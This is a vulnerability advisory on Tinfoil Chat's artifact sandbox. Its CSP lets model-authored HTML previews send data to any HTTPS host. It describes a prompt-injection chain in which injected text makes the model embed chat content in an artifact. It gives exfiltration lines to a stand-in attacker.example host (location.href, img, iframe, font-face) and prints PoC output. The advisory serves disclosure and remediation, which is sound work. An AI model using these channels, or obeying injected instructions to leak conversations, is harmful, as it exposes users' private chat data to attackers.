# The artifact sandbox origin lets model-authored artifacts and code previews reach arbitrary HTTPS hosts

| | |
|---|---|
| Component | `github.com/tinfoilsh/tinfoil-webapp-sandbox` (served as webapp-sandbox.tinfoil.sh): HEAD `54ed549` |
| Severity | Medium (CVSS 3.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` = 6.5 for the primary scenario; reviewers' range 4.7 to 6.5) |
| Bug class | CWE-693 (protection mechanism failure: scheme-wide `https:` sources in the sandbox CSP), CWE-201 |
| Attacker position | Author of a web page or document whose text reaches the model's context (prompt injection), plus one victim click on "Preview"/"Run". No network or Tinfoil position |
| Status | Unfixed at upstream HEAD as of 2026-10-08; not disclosed |

## Summary

Tinfoil Chat runs model-authored HTML artifacts and ```html / ```javascript code blocks in an iframe on
webapp-sandbox.tinfoil.sh. The sandbox README says none of these previews "can reach the network".
That is false. The sandbox's own CSP header allows `img-src`, `media-src`, `font-src` and `frame-src` from
any `https:` host. The `artifact` kind gets no per-kind `<meta>` CSP, so it inherits those directives,
and every kind can navigate its own nested frame to any https URL. An injected instruction that makes the
model embed chat content in an artifact or code block leaks that content, plus the user's IP, to an
attacker host once the user clicks Preview or Run. It is weaker than Finding 6 (one click, only what the
model writes into the payload), but it is a separate component and stays open after Finding 6 is fixed.

## Threat model

What Tinfoil promises:
- `tinfoil-webapp-sandbox/README.md:73-77`: "The nested document for each kind is the template the chat
  used to inline as a `data:` URL, including its per-kind `<meta>` CSP: none of them can reach the
  network."
- `README.md:17-19`: the origin "stores no user data … holds no secrets". This part is true: the opaque
  origin cannot read the chat. The leak is of the payload the chat sends in.

| Deployment mode / attacker | What they must control | Exploitable? | Result |
|---|---|---|---|
| chat.tinfoil.sh + webapp-sandbox.tinfoil.sh, ```html or ```javascript code block (kinds `html`, `js`) | Text the model reads (web page, document); model must emit a code block with the data; user clicks Run | Yes, via self-navigation of the nested frame (`location.href = 'https://attacker/?d=…'`) | Whatever the model put in the code block, plus IP |
| Same, GenUI HTML artifact (kind `artifact`) | As above, plus the control plane must offer `render_artifact_preview` (allowlist in `genui/enabled-widgets.ts`, unverified); user clicks Preview | Yes, via `<img>`, `<iframe>`, `@font-face`, `<audio>/<video>`, self-navigation | Same, plus an attacker page framed inside the chat UI, which can `fetch()` freely from its own origin |
| Vercel preview hosts / `localhost:3000` embedders | Same | Yes; `vercel.json:62` has the same resource directives | Same |
| Malicious model / router output | The enclave's output | Yes, deterministically | Outside Tinfoil's attacker model; not scored |
| Network attacker, Tinfoil operator | n/a | Not needed | n/a |

Preconditions, verified in code:
- `vercel.json:47` (host webapp-sandbox.tinfoil.sh) and `:62` (all other hosts): `default-src 'none';
  … img-src https: data: blob:; media-src https: data: blob:; font-src https: data:; frame-src https: data:;
  … sandbox allow-scripts`. No `connect-src`, so `fetch()` falls back to `default-src 'none'` (blocked).
- `preview.js:71-73`: the `artifact` builder only injects storage polyfills. No `<meta>` CSP, so the
  `srcdoc` document inherits the header policy.
- `preview.js:42-69`: `html` and `js` get a `<meta>` CSP (`img-src data:` / none). That stops subresource
  loads, but navigating the nested frame itself is governed by the embedding document's `frame-src https:`.
- `preview.js:115`: `runner.srcdoc = build(m)`; `preview.html:9` gives the nested frame no `sandbox`
  attribute of its own (it inherits the outer `allow-scripts`).
- Embedder (`tinfoil-webapp` c061681): `ArtifactPreview.tsx:257` and `code-block.tsx:298,394` use
  `sandbox="allow-scripts"`; HTML artifacts start in source view (`ArtifactPreview.tsx:373-375`) and
  executable fences start in code view (`code-block.tsx:47`, `EXECUTABLE_LANGUAGES`), so one click is
  needed; the payload is posted unmodified (`sandbox-frame.tsx:54-105`).

Unverified production facts:
- That webapp-sandbox.tinfoil.sh serves `vercel.json`'s headers verbatim. Both host blocks carry the same
  resource directives, so Vercel block precedence does not matter.
- Whether the control plane enables `render_artifact_preview`. The code-block path needs no flag.
- Model compliance with the injection (no model runs locally).
- Browser coverage: Chromium only. srcdoc CSP inheritance is spec behaviour; Firefox/Safari were not run.

Out of scope / checked and not affected:
- Sandbox escape: none. The attacker frame has an opaque origin, inherits `allow-scripts` only, cannot
  submit forms, open popups or navigate the top window, and cannot read chat storage.
- `fetch()`, `sendBeacon`, remote `<script>` and external stylesheets from the previews are blocked.
- The `/map` route has its own allowlisted CSP and is not affected.

## Severity

- Primary (code block or artifact carrying conversation content, model compliance not counted, one click):
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` = **6.5**.
- Conservative (model compliance as `AC:H`): `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` = 5.3.
- One reviewer scored only what the model can be coaxed to embed: `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N` = 4.7.

All three reviewers upheld it as Medium (confidence 0.8 to 0.9). We keep **Medium**. Today the zero-click
chat-origin channel (Finding 6) dominates; this one matters because it survives that fix and contradicts
the documented isolation.

## Technical details

`tinfoil-webapp-sandbox/vercel.json:47`:

```
default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
img-src https: data: blob:; media-src https: data: blob:; font-src https: data:; frame-src https: data:;
base-uri 'none'; form-action 'none'; sandbox allow-scripts; frame-ancestors https://*.tinfoil.sh
```

`preview.js:69-73`:

```js
    // GenUI HTML artifact: model-authored document with storage shims, since
    // an opaque origin makes localStorage / document.cookie throw.
    artifact: function (m) {
      return injectArtifactPolyfills(String(m.html))
    },
```

A `srcdoc` iframe inherits its creator's CSP, so the artifact document may load images, fonts, media and
frames from any https host. For all kinds, `location.href = 'https://attacker/…'` in the nested document
is a navigation of a child of `/preview`, checked against `/preview`'s `frame-src https:`, not against
the child's own `<meta>` CSP.

## Proof of concept

Files in `poc/`:
- `sandbox-exfil.mjs` (the hunter's script, with paths parameterised and a summary line added): starts
  headless Chromium with `--host-resolver-rules="MAP * ~NOTFOUND"` and answers every request with
  Playwright route interception. It serves:
  - a stand-in chat page on `https://chat.tinfoil.sh` with the chat CSP from `tinfoil-webapp/vercel.json`
    and the same embedding as `sandbox-frame.tsx` / `ArtifactPreview.tsx` (`sandbox="allow-scripts"`,
    nonce handshake);
  - the built `dist/` of the sandbox @ `54ed549` on `https://webapp-sandbox.tinfoil.sh` with the exact
    production-host headers from its `vercel.json`;
  - a collector on `https://attacker.example`.
  It runs three legitimate flows and nine attack cases (three of them are expected-blocked controls).
- `run.sh`: clones the local pristine sandbox repo at `54ed549` into
  `/root/tinfoil-review/work/disclosures/16/`, `npm ci` (Playwright 1.63.0 from its lockfile), builds
  `dist/` with the repo's own `build.mjs`, extracts the chat CSP from `tinfoil-webapp` @ `c061681`, then
  runs the script twice: shipped headers, and the proposed hardened CSP (negative control and fix check).

Run: `cd poc && ./run.sh`. No socket is opened to any Tinfoil host: the hostnames exist only inside
Playwright's interception, and DNS resolution is disabled.

Stubbed: the chat page is a faithful stand-in for the shipped Next.js embedder (same attributes,
handshake and message shape), not the real bundle. The model's output is a fixed payload.

Key output (`poc/expected-output.txt`, captured 2026-10-11):

```
##### Run 1: shipped headers
[ok] legit: html preview reports its height            (and 2 more legit flows ok)
[LEAK] artifact: <img> to attacker (img-src https:)
    image https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-via-img (frame=about:srcdoc, …)
[LEAK] artifact: <iframe> to attacker page, which fetches home (frame-src https:)
    document https://attacker.example/frame?d=CONFIDENTIAL_CHAT_CONTENT-via-frame
    fetch https://attacker.example/beacon?d=fetched-from-attacker-frame%3A%3Fd%3DCONFIDENTIAL_CHAT_CONTENT-via-frame
[LEAK] artifact: self-navigation of the nested frame
[LEAK] artifact: @font-face to attacker (font-src https:)
[no leak] artifact: fetch() to attacker (control: connect-src falls to default-src none)
[no leak] html preview: <img> to attacker (control: meta CSP img-src data:)
[LEAK] html preview: self-navigation of the nested frame
[no leak] js preview: fetch() to attacker (control: default-src none)
[LEAK] js preview: self-navigation of the nested frame
[summary] shipped headers: 6/9 cases reached the attacker (…3 controls…); legitimate flows working: 3/3; requests to any other host: 0

##### Run 2: hardened CSP
[summary] hardened CSP: 0/9 cases reached the attacker (…); legitimate flows working: 3/3; requests to any other host: 0
```

Full original evidence (hunter runs, plus two verifiers' independent reproductions, one with real loopback
HTTPS servers and one showing `<audio>`/`<video>` and a 300 KB `fetch()` POST from the framed attacker
page): `/root/tinfoil-security-findings/webapp-sandbox-origin-exfil/evidence/` and
`/root/tinfoil-review/work/verify2/webapp-sandbox-bridge--sandbox-origin-network-exfil--*/`.

## Impact

After a prompt injection, the model writes an HTML artifact or a ```html block that contains, for
example, a summary of the conversation in an image URL or a `location.href` assignment. When the user
clicks Preview or Run, the browser sends that data and the user's IP to the attacker's host. In the
artifact case the attacker can also show their own page inside the "verified" chat panel (a phishing
surface, though forms and popups are blocked by the sandbox flags). Exposure is limited to what the
model put in the payload; the sandbox cannot read anything else.

### Affected downstream packages

- `tinfoil-webapp` (`c061681`) embeds this origin for artifact previews and ```html / ```javascript code-block previews

## Remediation

1. In `vercel.json` (both host blocks), remove the scheme-wide sources:
   `img-src data: blob:; media-src data: blob:; font-src data:` and drop `frame-src` so it falls back to
   `default-src 'none'`. `srcdoc` nested frames still load. Validated locally: Run 2 of the PoC blocks
   all nine attack cases and the three legitimate flows keep working.
2. Inject a per-kind `<meta>` CSP for the `artifact` kind as well (`preview.js:71-73`), matching `html`.
3. Defence in depth: put an explicit `sandbox="allow-scripts"` on the nested `#runner` iframe
   (`preview.html:9`). This does not stop self-navigation; item 1 does.
4. Correct `README.md:77`.

## References

- Finding 6, `disclosures/06-webapp-remote-image-exfiltration/`: the zero-click chat-origin image channel
  (same attacker, stronger).
- Finding 17, `disclosures/17-ios-remote-image-exfiltration/`.
- `REPORT.md`, Finding 16; verdicts in `verification-verdicts-round2.json`
  (`webapp-sandbox-bridge/sandbox-origin-network-exfil`, 3/3 upheld).
- HTML Standard: `srcdoc` documents inherit the policy container of their parent; CSP3 `frame-src`
  governs navigations of child browsing contexts.
